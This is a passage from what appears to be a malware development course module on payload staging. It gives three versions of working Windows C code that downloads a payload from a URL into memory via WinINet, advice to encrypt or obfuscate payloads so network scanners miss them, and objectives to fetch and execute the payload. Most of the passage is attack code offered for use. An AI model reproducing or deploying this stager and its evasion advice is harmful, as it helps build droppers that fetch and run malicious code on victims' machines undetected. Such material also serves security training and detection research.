<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetPayloadFromUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	HINTERNET	hInternet              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			    hInternetFile          <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	
	PBYTE		pBytes                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	DWORD		dwBytesRead            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// Opening an internet session handle</span>
	hInternet <span class="token operator">=</span> <span class="token function">InternetOpenW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternet <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetOpenW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Opening a handle to the payload's URL</span>
	hInternetFile <span class="token operator">=</span> <span class="token function">InternetOpenUrlW</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">,</span> L<span class="token string">"http://127.0.0.1:8000/calc.bin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_FLAG_HYPERLINK <span class="token operator">|</span> INTERNET_FLAG_IGNORE_CERT_DATE_INVALID<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternetFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetOpenUrlW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Allocating a buffer for the payload</span>
	pBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token number">272</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Reading the payload</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InternetReadFile</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">,</span> pBytes<span class="token punctuation">,</span> <span class="token number">272</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetReadFile Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">InternetSetOptionW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_OPTION_SETTINGS_CHANGED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">LocalFree</span><span class="token punctuation">(</span>pBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Dynamic Payload Size Allocation</h3>
<p>The above implementation works when the payload size is known. When 
the size is unknown or is larger than the number of bytes specified in <code>InternetReadFile</code>, a heap overflow will occur resulting in the binary crashing.</p>
<p>One way to solve this issue is by placing <code>InternetReadFile</code> inside a while loop and continuously reading a constant value of bytes, which for this example will be <code>1024</code> bytes. The bytes are stored directly in a temporary buffer which will be of the same size, <code>1024</code>. The temporary buffer will be appended to the total bytes buffer which will continuously be reallocated to fit each newly read <code>1024</code> byte chunk. Once <code>InternetReadFile</code> reads a value that is less than <code>1024</code> then that's the indicator that it has reached the end of the file and will break out of the loop.</p>
<h3>Payload Staging With Dynamic Allocation - Code Snippet</h3>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetPayloadFromUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	HINTERNET	hInternet              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			    hInternetFile          <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	
	DWORD		dwBytesRead            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  
	SIZE_T		sSize                   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// Used as the total payload size</span>
	
	PBYTE		pBytes                  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// Used as the total payload heap buffer</span>
	PBYTE		pTmpBytes               <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// Used as the temp buffer of size 1024 bytes</span>

	<span class="token comment">// Opening an internet session handle</span>
	hInternet <span class="token operator">=</span> <span class="token function">InternetOpenW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternet <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetOpenW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Opening a handle to the payload's URL</span>
	hInternetFile <span class="token operator">=</span> <span class="token function">InternetOpenUrlW</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">,</span> L<span class="token string">"http://127.0.0.1:8000/calc.bin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_FLAG_HYPERLINK <span class="token operator">|</span> INTERNET_FLAG_IGNORE_CERT_DATE_INVALID<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternetFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetOpenUrlW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Allocating 1024 bytes to the temp buffer</span>
	pTmpBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pTmpBytes <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// Reading 1024 bytes to the temp buffer</span>
		<span class="token comment">// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InternetReadFile</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">,</span> pTmpBytes<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetReadFile Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Updating the size of the total buffer </span>
		sSize <span class="token operator">+=</span> dwBytesRead<span class="token punctuation">;</span>

		<span class="token comment">// In case the total buffer is not allocated yet</span>
		<span class="token comment">// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pBytes <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
			pBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span>
			<span class="token comment">// Otherwise, reallocate the pBytes to equal to the total size, sSize.</span>
			<span class="token comment">// This is required in order to fit the whole payload</span>
			pBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalReAlloc</span><span class="token punctuation">(</span>pBytes<span class="token punctuation">,</span> sSize<span class="token punctuation">,</span> LMEM_MOVEABLE <span class="token operator">|</span> LMEM_ZEROINIT<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pBytes <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Append the temp buffer to the end of the total buffer</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBytes <span class="token operator">+</span> <span class="token punctuation">(</span>sSize <span class="token operator">-</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pTmpBytes<span class="token punctuation">,</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Clean up the temp buffer </span>
		<span class="token function">memset</span><span class="token punctuation">(</span>pTmpBytes<span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// If less than 1024 bytes were read it means the end of the file was reached</span>
		<span class="token comment">// Therefore exit the loop </span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwBytesRead <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Otherwise, read the next 1024 bytes</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Clean up</span>
	<span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">InternetSetOptionW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_OPTION_SETTINGS_CHANGED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">LocalFree</span><span class="token punctuation">(</span>pTmpBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">LocalFree</span><span class="token punctuation">(</span>pBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Payload Staging Final - Code Snippet</h3>
<p>The <code>GetPayloadFromUrl</code> function now takes 3 parameters:</p>
<ul>
<li>
<p><code>szUrl</code>- The URL of the payload.</p>
</li>
<li>
<p><code>pPayloadBytes</code> - Returns as the base address of the buffer containing the payload.</p>
</li>
<li>
<p><code>sPayloadSize</code> - The total size of the payload that was read.</p>
</li>
</ul>
<p>The function will also correctly close the HTTP/S connections once the retrieval of the payload has been completed.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetPayloadFromUrl</span><span class="token punctuation">(</span>LPCWSTR szUrl<span class="token punctuation">,</span> PBYTE<span class="token operator">*</span> pPayloadBytes<span class="token punctuation">,</span> SIZE_T<span class="token operator">*</span> sPayloadSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BOOL		bSTATE            <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

	HINTERNET	hInternet         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			    hInternetFile     <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	DWORD		dwBytesRead       <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	
	SIZE_T		sSize             <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PBYTE		pBytes            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			    pTmpBytes          <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>



	hInternet <span class="token operator">=</span> <span class="token function">InternetOpenW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternet <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetOpenW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		bSTATE <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> <span class="token keyword">goto</span> _EndOfFunction<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	hInternetFile <span class="token operator">=</span> <span class="token function">InternetOpenUrlW</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">,</span> szUrl<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_FLAG_HYPERLINK <span class="token operator">|</span> INTERNET_FLAG_IGNORE_CERT_DATE_INVALID<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternetFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetOpenUrlW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		bSTATE <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> <span class="token keyword">goto</span> _EndOfFunction<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	pTmpBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pTmpBytes <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		bSTATE <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> <span class="token keyword">goto</span> _EndOfFunction<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span><span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InternetReadFile</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">,</span> pTmpBytes<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] InternetReadFile Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			bSTATE <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> <span class="token keyword">goto</span> _EndOfFunction<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		sSize <span class="token operator">+=</span> dwBytesRead<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pBytes <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
			pBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span>
			pBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalReAlloc</span><span class="token punctuation">(</span>pBytes<span class="token punctuation">,</span> sSize<span class="token punctuation">,</span> LMEM_MOVEABLE <span class="token operator">|</span> LMEM_ZEROINIT<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pBytes <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			bSTATE <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> <span class="token keyword">goto</span> _EndOfFunction<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		
		<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBytes <span class="token operator">+</span> <span class="token punctuation">(</span>sSize <span class="token operator">-</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pTmpBytes<span class="token punctuation">,</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">memset</span><span class="token punctuation">(</span>pTmpBytes<span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> dwBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwBytesRead <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	


	<span class="token operator">*</span>pPayloadBytes <span class="token operator">=</span> pBytes<span class="token punctuation">;</span>
	<span class="token operator">*</span>sPayloadSize  <span class="token operator">=</span> sSize<span class="token punctuation">;</span>

_EndOfFunction<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternet<span class="token punctuation">)</span>
		<span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternetFile<span class="token punctuation">)</span>
		<span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hInternet<span class="token punctuation">)</span>
		<span class="token function">InternetSetOptionW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_OPTION_SETTINGS_CHANGED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pTmpBytes<span class="token punctuation">)</span>
		<span class="token function">LocalFree</span><span class="token punctuation">(</span>pTmpBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> bSTATE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4>Implementation Note</h4>
<p>In this module, the payload was retrieved from the internet as raw 
binary data, without any encryption or obfuscation. While this approach 
may evade basic security measures that analyze the binary code for signs
 of malicious activity, it'll get flagged by network scanning tools. 
Therefore, if the payload is not encrypted, packets captured during the 
transmission may contain identifiable snippets of the payload. This 
could expose the payload's signature, leading to the implementation 
process being flagged.</p>
<p>In real-world scenarios, it is always advised to encrypt or obfuscate the payload even if it's fetched at runtime.</p>
<h3>Running The Final Binary</h3>
<p>The binary successfully fetches the payload.</p>
<p><img src="30_files/staging-demo-1.png" alt="image"></p>
<p>The connections are closed once execution is completed.</p>
<p><img src="30_files/staging-demo-2.png" alt="image"></p>

            
                
                                
            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Setup a local HTTP server that contains your payload</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Compile and run the provided code to fetch the payload from your local HTTP server and execute it</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>
            <div id="progress-container" class="hidden flex flex-col w-1/4 min-w-1/4">
                <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
                <div class="max-h-[300px]">
                                        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Modules Progress</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                            <a data-target="_self" href="./1.html">
                                <div for="module-1" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 1 - Welcome Module
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./2.html">
                                <div for="module-2" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 2 - Introduction To Malware Development
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./3.html">
                                <div for="module-3" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 3 - Required Tools
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./4.html">
                                <div for="module-4" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 4 - Coding Basics
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./5.html">
                                <div for="module-5" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 5 - Windows Architecture
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./6.html">
                                <div for="module-6" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 6 - Windows Memory Management
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./7.html">
                                <div for="module-7" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 7 - Introduction To The Windows API
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./8.html">
                                <div for="module-8" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 8 - Portable Executable Format
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./9.html">
                                <div for="module-9" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 9 - Dynamic-Link Library
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./10.html">
                                <div for="module-10" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 10 - Detection Mechanisms
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
